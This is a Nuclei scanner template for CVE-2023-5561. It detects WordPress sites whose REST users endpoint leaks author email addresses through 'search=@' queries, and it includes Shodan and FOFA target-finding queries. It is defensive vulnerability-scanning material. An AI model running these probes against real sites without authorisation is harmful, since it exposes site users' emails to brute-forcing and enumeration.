flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "/wp-content/plugins")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- attack: clusterbomb
  headers:
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/120.0.0.0 Safari/537.36
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    - contains_all(body, "[{\"id", "name\":")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/{{route}}search=@'
  payloads:
    route:
    - wp-json/wp/v2/users?
    - ?rest_route=/wp/v2/users&
  stop-at-first-match: true
id: CVE-2023-5561
info:
  author: nqdung2002
  classification:
    cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-5561
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-200
    epss-percentile: 0.97839
    epss-score: 0.53022
  description: 'WordPress Core is vulnerable to Sensitive Information Exposure in
    versions between 4.7.0 and 6.3.1 via the User REST endpoint. While the search
    results do not display user email addresses unless the requesting user has the
    ''list_users'' capability, the search is applied to the user_email column.

    '
  impact: 'This can allow unauthenticated attackers to brute force or verify the email
    addresses of users with published posts or pages on the site.

    '
  metadata:
    fofa-query: body="oembed" && body="wp-"
    framework: wordpress
    max-request: 2
    product: wordpress
    shodan-query:
    - cpe:"cpe:2.3:a:wordpress:wordpress"
    - http.component:"wordpress"
    vendor: wordpress
    verified: true
  name: WordPress Core - Post Author Email Disclosure
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-470-631-sensitive-information-exposure-via-user-search-rest-endpoint?asset_slug=wordpress
  - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5561
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: medium
  tags: cve,cve2023,wpscan,disclosure,wp,wordpress,email,exposure,vuln
